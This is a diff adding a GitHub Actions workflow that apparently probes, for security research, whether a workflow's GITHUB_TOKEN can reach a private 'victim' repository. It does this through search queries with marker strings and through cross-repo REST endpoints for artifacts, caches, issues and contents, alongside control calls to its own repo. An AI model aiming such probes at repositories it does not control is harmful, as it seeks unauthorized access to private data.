@@ -1,0 +1,44 @@
+name: r74-token-scope-probe
+on:
+  workflow_dispatch:
+permissions: {}
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe token scope against search API and cross-repo endpoints
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -u
+          api() { # $1 label, $2 method, $3 url, $4 data-or-empty
+            code=$(curl -s -o /tmp/b.json -w "%{http_code}" -X "$2" \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              ${4:+-d "$4"} "https://api.github.com$3")
+            total=$(python3 -c "import json; d=json.load(open('/tmp/b.json')); print(d.get('total_count', d.get('message','n/a')))" 2>/dev/null || echo "unparsable")
+            echo "$1 => HTTP $code | total_count/message: $total"
+          }
+          echo "--- token identity ---"
+          curl -s -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/user | python3 -c "import json,sys; d=json.load(sys.stdin); print('login:', d.get('login'), '| type:', d.get('type'))"
+          echo "--- P1 search/issues victim private repo ---"
+          api "P1" GET "/search/issues?q=repo:RahmaMaria/r74-victim-private+R74MARKER-ISSUE-Z4W8Q2"
+          echo "--- P2 search/commits victim private repo ---"
+          api "P2" GET "/search/commits?q=repo:RahmaMaria/r74-victim-private+K7M2P9"
+          echo "--- P3 search/code victim private repo ---"
+          api "P3" GET "/search/code?q=repo:RahmaMaria/r74-victim-private+R74VICTIM-7Q2X"
+          echo "--- P4 cross-repo artifacts list ---"
+          api "P4" GET "/repos/RahmaMaria/r74-victim-private/actions/artifacts"
+          echo "--- P5 cross-repo cache usage ---"
+          api "P5" GET "/repos/RahmaMaria/r74-victim-private/actions/cache/usage"
+          echo "--- P6 cross-repo metadata ---"
+          api "P6" GET "/repos/RahmaMaria/r74-victim-private"
+          echo "--- P7 direct REST issues list victim repo ---"
+          api "P7" GET "/repos/RahmaMaria/r74-victim-private/issues"
+          echo "--- P10 direct REST contents read victim repo ---"
+          api "P10" GET "/repos/RahmaMaria/r74-victim-private/contents/README.md"
+          echo "--- P8 search/issues OWN probe repo (control) ---"
+          api "P8" GET "/search/issues?q=repo:RahmaMaria/r74-actions-probe+r74"
+          echo "--- P9 POST create issue in OWN probe repo (write control) ---"
+          api "P9" POST "/repos/RahmaMaria/r74-actions-probe/issues" '{"title":"r74 write probe","body":"probe"}'
+          echo "--- done ---"
